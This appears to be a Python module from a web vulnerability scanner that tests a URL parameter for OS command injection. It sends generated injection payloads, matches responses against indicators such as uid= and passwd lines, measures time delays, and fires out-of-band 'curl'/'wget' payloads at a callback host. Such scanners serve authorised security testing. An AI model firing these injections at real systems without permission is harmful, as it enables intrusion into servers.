import re, time
from typing import Optional
import requests

from tools.log_utils import get_logger
from tools.http_client import build_url
from tools.payload_engine import generate
from tools.settings import settings

logger = get_logger("cmdi_detector")

OOB_CMDI_PAYLOADS = [
    "curl {oob_url}",
    "wget {oob_url}",
    "nslookup {oob_domain}",
    "ping -c 1 {oob_domain}",
]

OUTPUT_INDICATORS = [
    r"uid=\d+\([\w]+\)",
    r"gid=\d+\([\w]+\)",
    r"groups?=\d+\([\w]+\)",
    r"Microsoft Windows",
    r"NT AUTHORITY",
    r"root:[^:]+:\d+:\d+",
    r"www-data",
    r"bin/bash",
    r"bin/sh",
    r"cmd\.exe",
    r"command not found",
    r"is not recognized",
    r"TTY|tty",
    r"\d+ bytes from",
    r"time[<=]\d+",
    r"PING |ping statistics",
]


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, waf_name: Optional[str] = None,
          oob_url: Optional[str] = None,
          oob_domain: Optional[str] = None) -> dict:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    result = {"vulnerable": False, "type": None, "evidence": [], "payload": None,
              "oob_tested": False}

    output_seeds = generate("cmdi", "output", "all", waf_name)
    for entry in output_seeds:
        payload = entry["payload"]
        indicator = entry.get("indicator")
        try:
            r = sess.get(build_url(url, param, payload),
                         timeout=timeout)

            if indicator and indicator in r.text:
                result["vulnerable"] = True
                result["type"] = "output"
                result["evidence"].append("cmdi: %s => %s" % (payload[:15], indicator))
                result["payload"] = payload
                break

            for pat in OUTPUT_INDICATORS:
                if re.search(pat, r.text):
                    result["vulnerable"] = True
                    result["type"] = "output"
                    result["evidence"].append("cmdi: %s matched <%s>" % (payload[:15], pat))
                    result["payload"] = payload
                    break
        except Exception as e:
            logger.debug("cmdi payload %s: %s", payload[:15], e)
        if result["vulnerable"]:
            break

    if not result["vulnerable"]:
        time_seeds = generate("cmdi", "time", "all", waf_name)
        for entry in time_seeds:
            payload = entry["payload"]
            threshold = entry.get("threshold", 2.5)
            try:
                start = time.time()
                sess.get(build_url(url, param, payload),
                         timeout=timeout + 2)
                elapsed = time.time() - start
                if elapsed >= threshold:
                    result["vulnerable"] = True
                    result["type"] = "time"
                    result["evidence"].append("cmdi time: %s => %.1fs" % (payload[:15], elapsed))
                    result["payload"] = payload
                    break
            except Exception as e:
                logger.debug("cmdi time %s: %s", payload[:15], e)

    if not result["vulnerable"] and (oob_url or oob_domain):
        result["oob_tested"] = True
        for template in OOB_CMDI_PAYLOADS[:2]:
            try:
                payload = template.format(oob_url=oob_url or "", oob_domain=oob_domain or "")
                sess.get(build_url(url, param, payload), timeout=timeout)
            except Exception as e:
                logger.debug("cmdi oob %s: %s", payload[:20], e)

    return result
